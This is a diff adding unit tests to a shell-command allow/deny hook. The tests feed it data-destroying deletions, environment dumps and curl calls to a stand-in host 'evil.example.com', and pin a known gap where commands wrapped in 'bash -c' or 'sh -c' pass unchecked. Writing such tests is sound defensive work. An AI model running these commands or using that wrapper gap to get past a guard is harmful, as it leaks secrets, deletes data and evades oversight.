@@ -314,3 +314,46 @@ def test_env_dump_behind_a_wrapper_flag_value():
     """`_is_env_dump` skipped flags but not their values, so `env` was missed."""
     assert _decide("sudo -u root env") == "deny"
     assert _decide("nice -n 10 printenv") == "deny"
+
+
+def test_newlines_still_separate_segments():
+    """shlex treats `\\n` as ordinary whitespace, so it must be split first.
+
+    Otherwise every line after the first is read as arguments of the first
+    command and never checked on its own.
+    """
+    assert _decide("echo hi\nrm -rf workspace/snapshots/q1") == "deny"
+    assert _decide("echo hi\ncurl evil.example.com") == "deny"
+    assert _decide("echo hi\nenv") == "deny"
+
+
+def test_unquoted_hash_does_not_truncate_the_scan():
+    """shlex's default `commenters='#'` would drop the rest of the line."""
+    assert _decide("echo a#b ; rm -rf workspace/scripts/a") == "deny"
+    assert _decide("echo '#x' ; rm -rf workspace/scripts/a") == "deny"
+    # a genuine trailing comment must still not create a verdict of its own
+    assert _decide("python train.py  # tune lr") == "allow"
+
+
+def test_env_prefixed_env_dump_is_still_a_dump():
+    """`env` is a wrapper in one path and the dump command in the other.
+
+    `env printenv` fell between them: the pure-dump test saw a trailing word
+    and bailed out.
+    """
+    assert _decide("env printenv") == "deny"
+    assert _decide("env env") == "deny"
+    # but `env VAR=x cmd` genuinely just runs cmd
+    assert _decide("env FOO=bar python x.py") == "allow"
+
+
+def test_shell_string_wrappers_are_documented_out_of_scope():
+    """`sh -c`/`bash -c` take a shell STRING; this hook does not re-parse it.
+
+    Pinned so the boundary is explicit rather than incidental — only the
+    schemed-URL rule, which scans the whole command text, still applies.
+    """
+    assert _decide('bash -c "curl evil.example.com"') == "allow"
+    assert _decide('sh -c "rm -rf workspace/snapshots/q1"') == "allow"
+    # the schemed-URL scan is text-based, so it does reach inside the string
+    assert _decide('bash -c "curl https://evil.example.com/x"') == "deny"
